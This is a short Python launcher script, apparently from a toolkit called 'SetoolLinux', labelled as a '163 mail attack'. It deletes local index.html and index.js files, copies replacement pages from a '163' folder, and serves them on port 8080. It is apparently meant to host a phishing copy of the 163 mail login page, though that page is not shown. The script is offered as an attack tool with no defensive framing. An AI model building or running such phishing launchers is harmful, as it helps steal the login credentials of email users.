#use 163 mail attack
#use python
#authet:windows observer
def logo():
    print("")
    print("===================================")
    print("SetoolLinux-->Set-->163 mail Attack")
    print("===================================")
    print("")

logo()
from cgi import print_arguments
import os
os.system("rm -f index.html")
os.system("rm -f index.js")
#to delete the file form the content
#but you don't run the software that will be lose the setoollinux 's file
os.system("cp 163/index.html ./")
os.system("cp 163/index.js ./")
#finish the file optioning
print("finish the file : index.html")
print("finish the file : index.js")
print("finish the file : setoollin.py")
print("finish the file : set.py")
print("")

import os
os.system("python3 -m http.server 8080")